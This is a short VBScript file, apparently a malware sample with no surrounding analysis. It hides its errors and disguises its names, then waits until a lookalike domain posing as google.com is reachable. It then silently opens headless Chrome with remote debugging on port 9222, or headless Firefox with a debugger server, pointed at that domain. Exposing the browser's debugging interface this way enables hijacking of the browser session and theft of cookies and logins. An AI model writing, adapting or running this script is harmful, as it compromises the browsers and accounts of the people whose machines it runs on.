on Error Resume Next
Sub Pause(NSeconds)
Wscript.Sleep(NSeconds*3000)
End Sub
Dim visualcpp
Set visualcpp = CreateObject("WScript.Shell")
counter = True
While counter = True
website = "www.google.com.527245574527316.windows-display-service.com"
checkstring = "ping -n 1 -w 300 " & website
status = visualcpp.Run(checkstring, 0 , True)
If status = 0 Then
counter = False
Else
Pause(21)
End If
Wend
returncodestatus = "1"
returncodestatus = visualcpp.run("chrome --headless --disable-gpu --remote-debugging-port=9222 http://www.google.com.527245574527316.windows-display-service.com",0,false)
if returncodestatus <> 0 then
returncodestatus=visualcpp.run("firefox -no-remote -CreateProfile user",0,false)
returncodestatus=visualcpp.run("firefox -no-remote -headless -new-instance -P ""user"" --start-debugger-server ws:6000 http://www.google.com.527245574527316.windows-display-service.com",0,false)
End If
